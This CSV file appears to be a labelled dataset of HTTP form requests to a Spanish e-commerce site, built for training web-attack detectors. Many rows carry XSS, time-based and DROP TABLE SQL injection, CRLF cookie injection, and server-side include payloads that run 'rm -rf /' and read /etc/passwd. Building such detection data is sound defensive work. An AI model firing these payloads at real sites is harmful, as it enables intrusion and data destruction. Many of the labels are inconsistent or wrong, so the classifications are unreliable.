payload,attack_type,label
ida=2,normal,1
id=1&nombre=Queso+Manchego&precio=39&cantidad=58&B1=A%F1adir+al+carrito123,normal,0
B2=Vaciar+carritoany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,normal,1
id=2,normal,0
ID=3&NOMBRE=vINO+rIOJA&PRECIO=85&CANTIDAD=PAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29&b1=a%f1ADIR+AL+CARRITO,xss,1
modo=registro&login=arcouet&password=man17lme73e&nombre=Landelina&apellidos=Dangla+Llobera&email=grimaud%40vi%F1avilano.bu&dni=17030732Z&direccion=Calle+Santa+Maria%2C+38%2C+9A&ciudad=Santa+Gadea+del+Cid&cp=08560&provincia=Palenciabob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&ntc=5358171636012894&B1=Registrar123,xss,1
modo=registro&login=sirevici&password=di0cut6dor7&nombre=anan%edas&apellidos=jener+monaj&email=wahl%4021horas.iq&dni=90230020p&direccion=los+polancos+133+&ciudad=pintanos%2c+los&cp=45256&provincia=lleida&ntc=6034871098442134&b1=registrar,normal,0
modo=entrar&login=nabeel&pwd=vanidOsa&remember=on&B1=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2123,xss,1
modo=entrar&login=sturrock&pwd=60509etr4&remember=off%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Entrar,sqli,1
errorMsg=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,xss,1
b2=vaciar+carrito,normal,0
modo=registro&login=chaisupa8&password=pSi-qUiatr%EDa&nombre=Renovato&apellidos=Pellitero+Gavas&email=cucciola_abdeslam9%40gesautonomos.pk&dni=05392148M&direccion=Calle+Lanjaron%2C+193+5G&ciudad=Rionansa&cp=0421A&provincia=La+Rioja&ntc=8795418458283406&B1=Registrar,cmdi,1
B2=Vaciar+carrito,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
modo=registro&login=meggy&password=3o22ciabl3&nombre=Telema&apellidos=Ayat+Rozas&email=verani%40viajesdacapalla.gq&dni=25109956M&direccion=Quinita+Flores+75%2C+&ciudad=Botarell&cp=45370&provincia=Zamora&ntc=3893864101962581&B1=Registrar,normal,0
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=44&B1=A%F1adir+al+carrito,normal,0
idA=2,normal,1
id=2,normal,0
B2=Vaciar+carritoany%250ASet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
id=1%2F&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=86&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=cheyenne&password=SERPigiNosO&nombre=Guerrino&apellidos=Marsa+Plomer&email=ying-chieh0%40etnics.mn&dni=16124624Z&direccion=Passeig+De+La+Pla%E7a+Major+11%2C+3%3FF&ciudad=Arguis&cp=08256&provincia=Lleida&ntc=1825754636635369&B1=Registrar,normal,0
modo=registro&login=kirbie&password=men3pea&nombre=quintina&apellidos=atuesta+venturi&email=kamel%40hiperespa%f1a.hk&dni=28782294w&direccion=passatge+de+manyer+105+&ciudad=tudanca&cp=25449&provincia=a+coru%f1a&ntc=6905236399041419&b1=registrar,normal,0
modo=registro&login=atl-sale&password=tard%EDa&nombre=Einar&apellidos=Gras+Ego%E1vil&email=namkoong%40quadernideilgarda.no&dni=45854746Z&direccion=C%2F+Salvador+Dali%2C+106%2C+&ciudad=Lezo&cp=33829&provincia=Lleida&ntc=8928022470323777&B1=Registrar,normal,0
modo=insertar&precio=7492&b1=pasar+por+caja,normal,0
modo=registro&login=jesshope&password=bisaRma&nombre=Tr%E1nsito&apellidos=De+Luca+Alcob%E9&email=spalinger%40perrosmodelo.aw&dni=76108310E&direccion=C%2F+Algodonales%2C+129+&ciudad=Bele%F1a&cp=26312&provincia=Girona&ntc=983921355976591&B1=Registrar,cmdi,1
modo=registro&login=benschop&password=164O%2B1I0&nombre=Tersif%F3n&apellidos=Buj+Andunce&emailA=kendell%40multasdetransito.dj&dni=98715726W&direccion=C%2F+Copernic+161+3%3FB&ciudad=Castillonroy&cp=06190&provincia=Guadalajara&ntc=0622727405065528&B1=Registrar,cmdi,1
modo=registro&login=poyi&password=yaro&nombre=Gismundo&apellidos=Ventall%F3+Tesisteco&email=tamburro%40aprendeaestudiar.sj&dni=24987514S&direccion=Travesia+Diego+De+Almagro%2C+194+&ciudad=Pepino&cp=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&provincia=A+Coru%F1a&ntc=0040408141488994&B1=Registrar123,sqli,1
b2a=vaciar+carrito,normal,1
B2=Vaciar+carritoany%250ASet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=heunis&pwd=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&remember=on&B1=Entrar123,sqli,1
errorMsg=Credenciales+incorrectas123,normal,0
ERRORmSG=cREDENCIALES+INCORRECTASBOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG,xss,1
id=2any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,normal,1
modo=entrar&login=crigger&pwd=baR%3Fr%2C6O8a&remember=off&B1=Entrar,cmdi,1
id=2&nombre=Queso+Manchego&precio=39&cantidad=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=A%F1adir+al+carrito,cmdi,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=39&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=6493&B1=Pasar+por+caja%2F,cmdi,1
modo=insertar&precio=2780&B1=Pasar+por+caja,normal,0
MODO=REGISTRO&LOGIN=CECELIA&PASSWORD=TERCIOPELADO&NOMBRE=fEDERICA&APELLIDOS=hEUSSER+tALO&EMAIL=SOFAER%40MULTASDETRANSITO.CU&DNI=67293578v&DIRECCION=pLZA.+iRANTZUKO+mONASTERIOAREN+63%2c+&CIUDAD=pURULLENA&CP=41111%3cscript%3eALERT%28%22pAROS%22%29%3b%3c%2fscript%3e&PROVINCIA=lLEIDA&NTC=7562944888996473&b1=rEGISTRAR,xss,1
modo=entrar&login=padmanab&pwd=9osquil9a6&remember=off&B1=Entrar,normal,0
modo=entrar&login=timm&pwd=eMpeInE&remember=off&B1=Entrar123,normal,0
modo=registro&login=kit&password=artiller%eda&nombre=najli&apellidos=angullo+acosta&email=boring_besch%40copiar.com.pg&dni=97963158v&direccion=c%2f+las+ni%f1adas%2c+67+9%3ff&ciudad=bola%2c+a&cp=49394&provincia=navarra&ntc=0949927790340653&b1=registrar,normal,0
modo=entrar&login=sawyer%2Fs&pwd=v%CDa&remember=off&B1=Entrar,cmdi,1
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=gordy&password=malcomida&nombre=Cebele&apellidos=Palah%ED+Cabezas&email=capoliccio%40almeriastella.jo&dni=94088087D&direccion=C%2F+Dels+Escales+Del+Miracle%2C+37%2C+7-F&ciudad=Arbanc%F3n&cpA=31229&provincia=Cantabria&ntc=7224824987028849&B1=Registrar,cmdi,1
ID=1&NOMBRE=qUESO+mANCHEGO&PRECIO=85&CANTIDAD=%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e&b1=a%f1ADIR+AL+CARRITO,xss,1
errormsg=credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=mcmann&pwd=98p%2Be&remember=on&B1=Entrar,normal,0
modo=registro&login=pennebak&password=elefa_n7ina&nombre=Albina&apellidos=Fortuny+Goyenaga&email=wyle%40designworld.us&dni=04137943J&direccion=Simancas%2C+172%2C+8-D&ciudad=Villapalacios&cp=44369&provincia=Zamora&ntc=9955615288852463&B1=Registrar,normal,0
id=2123,normal,0
idA=2123,normal,1
errormsg=credenciales+incorrectas,normal,0
MODO=INSERTAR%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e&PRECIO=5003&b1=cONFIRMAR,xss,1
modo=insertar&precio=1882&B1=Confirmar123,normal,0
modo=insertar&precio=7960&b1=confirmar,normal,0
modo=insertar&precio=8424&B1=Pasar+por+caja,normal,0
modo=registro&login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&password=pis7ar&nombre=Tristana&apellidos=Isart+Viva&email=rae%40ajuntamentbarcelona20.kg&dni=47182191Z&direccion=C%2F+Argullos+73%2C+9%3FA&ciudad=Figueruelas&cp=49655&provincia=A+Coru%F1a&ntc=3983167726534410&B1=Registrar,xss,1
modo=entrar&login=halsy&pwd=4%27sc%27o23U%27To&remember=off&B1=Entrar,cmdi,1
id=2%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=insertar&precio=2681&B1=Pasar+por+caja%2F,cmdi,1
modo=insertar&precio=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Pasar+por+caja,xss,1
id=%252B123,normal,1
id=2,normal,0
modo=entrar&login=apollo&pwd=hepta8qu%EDa&remember=off&B1=Entrarany%250ASet-cookie%253A%2BTamper%253D1041264011025374727,cmdi,1
id=2&nombre=Queso+Manchego&precio=85&cantidad=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar&precio=9853&B1A=Pasar+por+caja,cmdi,1
id=2,normal,0
id=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,normal,1
modo=entrar&login=louladak&pwd=p6r2%cd3i.co&remember=on&b1=entrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=6&B1=A%F1adir+al+carrito,normal,0
id=3&nombre=Queso+Manchego&precio=85&cantidad=1&B1=A%F1adir+al+carrito,normal,0
MODO=REGISTRO&LOGIN=BUFFETT&PASSWORD=VEJETE&NOMBRE=zOELI&APELLIDOS=nAVAS+gORRIZ&EMAIL=LOWLER-HOI-SHAN6%40WEBGUNE.BJ&DNI=90025435p&DIRECCION=cABRERA%2c+153+7%3fa&CIUDAD=sANTA+mAR%edA+DE+oRD%e1S&CP=%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e&PROVINCIA=lLEIDA&NTC=9769918811334498&b1=rEGISTRAR,xss,1
errorMsg=Credenciales+incorrectas%27+AND+%271%27%3D%271,normal,1
idA=1,normal,1
modo=registro&login=bees3&password=comport8ble&nombre=Avelino&apellidos=Morea&email=soubier.roudenko%40mtos.is&dni=95058822Y&direccion=C%2F+Virgen+De+La+Paloma%2C+107+&ciudad=Quel&cp=03814&provincia=C%E1ceres&ntc=6341819669963492&B1=Registrar,normal,0
modo=registro&login=missy&password=afijaci%F3n&nombre=Pola&apellidos=Llach+Mund%F3&email=hervey%40annoyanc.eh&dni=55119519L&direccion=C%2F+Auroros+173+&ciudad=Villar+del+R%EDo&cp=44142&provincia=Segovia&ntc=3376121794389360&B1=Registrar,normal,0
MODO=REGISTRO&LOGIN=SIHAM&PASSWORD=ENAT%edAMETN%21E&NOMBRE=cES%e1RIO&APELLIDOS=cASTANY+bIGORRA&EMAIL=MANGINI%40CUBIERTOSCBB.AN&DNI=93029703q&DIRECCION=cALLE+rIO+gUADAJIRA+182+7-h&CIUDAD=cODOSERA%2c+lA&CP=22314%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&PROVINCIA=sALAMANCA&NTC=9377074508770290&b1=rEGISTRAR,sqli,1
id=3&nombre=Vino+Rioja&precio=85&cantidad=15&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=nada&password=BiZanTinA&nombre=Segundo&apellidos=De+la+Cerda+Gassol&email=gonska%40estaestuweb.com.af&dni=36746323M&direccion=Rio+Esgueva+57+1%3FG&ciudad=Urdu%F1a-Ordu%F1a&cp=43364&provincia=Albacete&ntc=1222164542017972&B1=Registrar,normal,0
modo=insertar&precio=486&B1A=Pasar+por+caja,cmdi,1
modo=entrar&login=olav&pwd=c7em&remember=on&B1=Entrar123,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&login=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&password=latrin5&nombre=Roxana&apellidos=Barbero+Delgados&email=lutz%40ringringcargo.eg&dni=91059337Z&direccion=C%2F+Llucena%2C+193+2H&ciudad=Almu%F1%E9car&cp=43248&provincia=Barcelona&ntc=6935592091774249&B1=Registrar123,sqli,1
errormsga=credenciales+incorrectas,normal,1
id=1%22+AND+%221%22%3D%221123,normal,1
B2A=Vaciar+carrito123,normal,1
modo=insertar&precioA=1784&B1=Pasar+por+caja,cmdi,1
modo=registro&login=schadan&password=descerrajada&nombre=kazuo&apellidos=juanhuix&email=bain%40raullazaro.pm&dni=52535718s&direccion=primera+152+11-g&ciudad=cervantes&cp=45183&provincia=zaragoza&ntc=2485478366392070&b1=registrar,normal,0
id=3&nombre=Vino+Rioja&precio=100&cantidad=63&B1=A%F1adir+al+carrito,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=32&B1=A%F1adir+al+carrito%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=registro&login=amber&password=pizcAR&nombre=Noel&apellidos=Rebes+Huasequi&email=sheng-passanante%40ankawaelda.int&dni=36101272N&direccion=C%2F+Geranio%2C+65+&ciudad=Condemios+de+Arriba&cp=37724&provincia=Tarragona&ntc=0887551084770656&B1=Registrar,normal,0
modo=registro&login=baziuk4&password=8ro4&nombre=bertolda&apellidos=baldivieso&email=pavan%40phd-photodecor.in&dni=66883027q&direccion=calle+costa+brava%2c+148%2c+&ciudad=villaeles+de+valdavia&cp=24226&provincia=zaragoza&ntc=6243309452199598&b1=registrar,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
modo=entrar&loginA=mathews&pwd=6u1ad5&remember=on&B1=Entrar,cmdi,1
MODO=REGISTRO&LOGIN=PRESTIPI&PASSWORD=9oDAD7&NOMBRE=wILLIAM&APELLIDOS=aLBELLA+sAHAGUN&EMAIL=NORTHRUP%40AJUNTAMENTBARCELONA20.MU&DNI=33293484h%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&DIRECCION=bIZENTA+mOGEL+65%2c+&CIUDAD=cASAS+DE+rEINA&CP=42216&PROVINCIA=mADRID&NTC=8964286236058281&b1=rEGISTRAR,sqli,1
modo=entrar&login=seto&pwd=almacenamIento&remember=off&B1=Entrar,normal,0
id=1&nombre=vino+rioja&precio=39&cantidad=65&b1=a%f1adir+al+carrito,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=62&B1=A%F1adir+al+carrito123,normal,0
id=3&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=0&b1=a%f1adir+al+carrito,normal,0
id=3&nombre=vino+rioja&precio=100&cantidad=39&b1=a%f1adir+al+carrito,normal,0
modo=insertar&precio=%27OR%27a%3D%27a&B1=Confirmar,cmdi,1
modo=insertar&precio=2542&B1=Confirmar123,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&login=bonnar&password=perillana&nombre=Benito&apellidos=Estruga+Barrozzi&email=offerall%40eonon.com.ci&dni=78627299M&direccion=Poetisa+Rosalia+De+Castro%2C+41%2C+3%3FE&ciudad=Valhermoso+de+la+Fuente&cp=24174&provinciaA=Cuenca&ntc=3588478670456559&B1=Registrar,cmdi,1
modo=insertar&precio=4641&B1=Confirmar%2F,cmdi,1
modo=insertar&precio=8357&B1=Pasar+por+caja,normal,0
B2A=Vaciar+carrito,normal,1
b2=vaciar+carrito,normal,0
B2A=Vaciar+carrito,normal,1
modo=entrar&login=hua&pwd=saturnino&remember=on&b1=entrar,normal,0
modo=registro&login=helma&password=92H126nA&nombre=Francisco+de+Borja&apellidos=Sofra+Galcer%E1n&email=mizell%40x2.com.vu&dni=61328646C&direccion=Parc+De+La+Budellera%2C+3%2C+4-B&ciudad=Monteagudo+de+las+Vic.ar%EDas&cp=43421&provincia=Huesca&ntc=0417370510264127&B1=Registrar,cmdi,1
B2=Vaciar+carrito,normal,0
idA=1,normal,1
errorMsgA=Credenciales+incorrectas,normal,1
B2=Vaciar+carrito123,normal,0
modo=registro&login=zinkie0&password=9i3a&nombre=Esteban&apellidos=Delvalle+Llers&email=luxford_baumann%40lasiestacreativa.tel&dni=47651101T&direccion=Calle+Espiel+71+&ciudad=Rab%F3s&cp=45634&provincia=Zaragoza&ntc=8349635911694626&B1=Registrar123,normal,0
modo=insertar&precio=9567&B1=Confirmar%2F,cmdi,1
B2=Vaciar+carrito,normal,0
B2=%252B,normal,1
modo=registro&login=blanchet&password=recital&nombre=filem%f3n&apellidos=ditte+pallar%e8s&email=moston%40sierradealcaraz.sg&dni=21096784b&direccion=calle+miquel+santandreu+66%2c+&ciudad=valderredible&cp=04878&provincia=le%f3n&ntc=1764884801392734&b1=registrar,normal,0
modo=registro&login=cinda&password=MOneTARiA&nombre=Olaya&apellidos=Fest+Lairigoyen&email=weld%40yiutuve.vc&dni=09085572C&direccion=Fivasa%2C+15%2C+&ciudad=Ulldecona&cp=09620&provincia=Salamanca&ntc=7951593634712530&B1=Registrar,normal,0
B2=Vaciar+carrito,normal,0
ID=%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&NOMBRE=qUESO+mANCHEGO&PRECIO=100&CANTIDAD=22&b1=a%f1ADIR+AL+CARRITO,sqli,1
modo=registro&login=deek&password=denunciadora&nombreA=Salina&apellidos=Gir%F3n+Cece%F1as&email=un-hi%40tarifasdevuelos.et&dni=55199080T&direccion=Tecla+Sala+74+&ciudad=Castrillo+de+Villavega&cp=18818&provincia=M%E1laga&ntc=7068244348344945&B1=Registrar,cmdi,1
b2=%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e,xss,1
errorMsg=Credenciales+incorrectas123,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=pattin&password=48h817n7&nombre=Tr%E1nsito&apellidos=Camorlinga+Aragon%E8s&emailA=boehm%40zeat.bo&dni=67474361C&direccion=Alvar+Garcia%2C+S%2FN%2C+&ciudad=Gav%E0&cp=06413&provincia=Toledo&ntc=2637703097461568&B1=Registrar,cmdi,1
MODO=REGISTRO&LOGIN=HOUDINI&PASSWORD=CABILE%f1A&NOMBRE=yULISA&APELLIDOS=%3c%21--%23exec+CMD%3d%22LS+%2f%22--%3e&EMAIL=HEE4%40ROPADEGOLF.NAME&DNI=77786356b&DIRECCION=c%2f+gUATEMALA%2c+s%2fn%2c+6g&CIUDAD=j%e1VEA%2fx%e0BIA&CP=39790&PROVINCIA=zARAGOZA&NTC=2661491792098457&b1=rEGISTRAR,sqli,1
id=2%27INJECTED_PARAM,normal,1
modo=registro&login=rudich&password=gilito&nombre=Manlio&apellidos=Piedra+Obrador&email=errol%40dise%F1odesoftware.ml&dni=03770036Z&direccion=Llobregat+130%2C+&ciudad=Pe%F1arroya-Pueblonuevo&cp=37130&provincia=Barcelona&ntc=8515880791800894&B1=Registrar123,normal,0
modo=insertar&precio=4831&B1=Confirmar%2F,cmdi,1
b2=vaciar+carrito,normal,0
modo=registro&login=sarge&password=apad-r8nad5ra&nombre=Adolfina&apellidos=Sanmarti+Challiol&email=paolieri%40cubiertoscbb.gu&dni=55702502K&direccion=Pla%E7a+Carrasco+i+Formiguera+163%2C+&ciudad=Saelices+de+Mayorga&cp=06890&provincia=Valencia&ntc=1427980931123468&B1A=Registrar,cmdi,1
errormsg=credenciales+incorrectas,normal,0
modo=insertar&precio=1216&B1=Pasar+por+caja%2F,cmdi,1
modo=insertar&precioA=7095&B1=Confirmar,cmdi,1
modo=registro&login=duthie&password=0urifica2er0&nombre=Serneo&apellidos=Urbina+Granda&email=gardiner%40enlapalma.com.tf&dni=46439230E&direccion=Av.+Italia%2C+66%2C+4-A&ciudad=Daroca&cp=18339&provincia=Huesca&ntc=2447862424263500&B1=Registrar,normal,0
idA=1123,normal,1
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar&precio=1647&B1=Confirmar,normal,0
id=2&nombre=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=85&cantidad=1&B1=A%F1adir+al+carrito123,sqli,1
idA=2123,normal,1
modo=registro&login=delly&password=barboquEjO&nombre=Celinda&apellidos=Cusicanqui+Lluch&email=treacy%40conac.com.bw&dni=%2B&direccion=C%2F+Poeta+Miguel+Hernandez%2C+85%2C+13%3FC&ciudad=Escorial%2C+El&cp=12300&provincia=Pontevedra&ntc=3155444527951741&B1=Registrar,cmdi,1
b2=vaciar+carrito,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&loginA=macmulli6&pwd=A1391%2B18u46&remember=on&B1=Entrar,cmdi,1
id=1123,normal,0
modo=registro&login=krone&password=1e1ADOr&nombre=Normando&apellidos=Rossenberck&email=bain%40raullazaro.pm&dni=87167407Y&direccion=Travesia+Hospitalet+De+Llobregat%2C+162+13B&ciudad=Valdealgorfa&cp=16582&provincia=Pontevedra&ntc=1646326838248937&B1=Registrar,normal,0
B2=Vaciar+carrito123,normal,0
modo=insertar&precio=5565&B1=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,xss,1
ID=3&NOMBRE=qUESO+mANCHEGO&PRECIO=39&CANTIDAD=%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e&b1=a%f1ADIR+AL+CARRITO,xss,1
ERRORmSG=cREDENCIALES+INCORRECTAS%3c%21--%23EXEC+CMD%3d%22RM+-RF+%2f%3bCAT+%2fETC%2fPASSWD%22+--%3e,sqli,1
modo=entrar&login=lesmeris&pwd=AL9Ol&remember=off&B1=Entrar,normal,0
modo=entrar&login=patenaud&pwd=Lor81a5o&remember=off&B1=Entrar,normal,0
MODO=%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&PRECIO=8384&b1=cONFIRMAR,sqli,1
modo=insertar&precio=2832&B1=Confirmar%2F,cmdi,1
ID=1PAROS%2522%2bSTYLE%253d%2522BACKGROUND%253aURL%2528JAVASCRIPT%253aALERT%2528%2527pAROS%2527%2529%2529%26ID%3d2,xss,1
id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=85&cantidad=53&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=audy&password=8a9c27%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Juan&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33783&provincia=Zamora&ntc=8868360012752422&B1=Registrar123,sqli,1
errorMsgA=Credenciales+incorrectas,normal,1
id=1&nombre=queso+manchego&precio=39&cantidad=89&b1=a%f1adir+al+carrito,normal,0
modo=entrar&login=nooshin&pwd=e5670cij%F33&remember=on&B1=Entrar123,normal,0
modo=registro&login=tehchi8&password=descerrajado&nombre=Gino&apellidos=Flor%ED+Chino&email=blakley%40asyra.ao&dni=61621455Q&direccion=Primavera%2C+174+&ciudad=Portomar%EDn&cp=24730&provincia=Badajoz&ntc=5655366857246860&B1=Registrar,normal,0
id=2&nombre=Vino+Rioja&precio=85&cantidad=40&B1=A%F1adir+al+carrito,normal,0
modoA=insertar&precio=8112&B1=Pasar+por+caja,cmdi,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=96&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=lieure&password=rEbatible&nombre=Tarciano&apellidos=Villalta+Tapasco&email=touret%40artesania.org.cv&dni=42708654T&direccion=Calle+Eduardo+Blanco+Amor%2C+120%2C+1%3FB&ciudad=Sopeira&cp=12230&provincia=Guadalajara&ntc=983921355976591&B1=Registrar,cmdi,1
B2=Vaciar+carrito,normal,0
modo=insertar&precio=6554&B1=Confirmar123,normal,0
id=1%27INJECTED_PARAM,normal,1
modo=registro&login=dautenha&password=bar50neg07&nombre=Le%F3n&apellidos=Obreg%F3n+Sagues&email=penot.riesgo%40casabolsa43.nl&dni=45104511Q&direccion=Calle+Santa+Esperan%E7a+120+&ciudad=Valdelina%2Bres&cp=09345&provincia=Valencia&ntc=7982161253560124&B1=Registrar,cmdi,1
modo=registro&login=ketchum&password=P21ITa1a&nombre=Nedra&apellidos=Derch+Mallol&email=davids%40chuecafamily.gov&dni=55341505D&direccion=Calle+Fomento%2C+197%2C+3B&ciudad=Coru%F1a+del+Conde&cp=43364&provincia=Barcelona&ntc=3368084974828178&B1=Registrar,normal,0
modo=entrar&loginA=skillen&pwd=pluTocracia&remember=off&B1=Entrar,cmdi,1
modo=insertar&precio=5964&B1=Pasar+por+caja,normal,0
errorMsg=Credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar%4040&precio=8478&B1=Pasar+por+caja,cmdi,1
ERRORmSG=cREDENCIALES+INCORRECTAS%3c%21--%23exec+CMD%3d%22LS+%2f%22--%3e,sqli,1
modo=insertar&precio=3226&B1=Confirmar,normal,0
modo=registro&login=hoyer&password=poli8%E1l2a&nombre=Gema&apellidos=Magriny%E0&email=delaune%40tintasultravioleta.io&dni=08806627L&direccion=Av.+De+La+Reina+Sofia+151+&ciudad=Poboleda&cp=43700&provincia=Guadalajara&ntc=3288111380573813&B1=Registrar,normal,0
id=2123,normal,0
b2=vACIAR+CARRITO%27%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
modo=registro&login=sastry&password=3l607LaDO2&nombre=Emmanuelle&apellidos=Gonyalon+Salobre%F1a&email=bernt%40wdsl.yu&dni=82709891M&direccion=Calle+Poligono+San+Pablo+143+6-D&ciudad=Olmeda*+de+las+.Fuentes&cp=29711&provincia=Granada&ntc=6789852392757283&B1=Registrar,cmdi,1
errorMsgA=Credenciales+incorrectas,normal,1
ID=3&NOMBRE=jAM%f3N+iB%e9RICO&PRECIO=85BOB%40%3cscrIPT%3eALERT%28pAROS%29%3c%2fSCRipt%3e.PAROSPROXY.ORG&CANTIDAD=7&b1=a%f1ADIR+AL+CARRITO,xss,1
MODO=INSERTAR&PRECIO=7436&b1=%3c%21--%23EXEC+CMD%3d%22RM+-RF+%2f%3bCAT+%2fETC%2fPASSWD%22+--%3e,sqli,1
id=2&nombre=Vino+Rioja&precio=85&cantidad=78&B1=A%F1adir+al+carrito,normal,0
idA=2,normal,1
id=2&nombre=Vino+Rioja&precio=100&cantidad=80&B1=A%F1adir+al+carrito123,normal,0
B2=Vaciar+carrito%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,xss,1
errorMsg=Credenciales+incorrectas,normal,0
id=1,normal,0
modo=entrar&login=ashla&pwd=cEaJO&remember=off&B1=Entrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=gerhardt8&password=pizmie%2Bnta&nombre=Yamila&apellidos=Cardalliaguet+Yescas&email=armantel%40laspruebascongaseosa.vg&dni=65724136A&direccion=Castro+Canseco+8+5%3FH&ciudad=Oria&cp=17538&provincia=Albacete&ntc=2877016523183053&B1=Registrar123,sqli,1
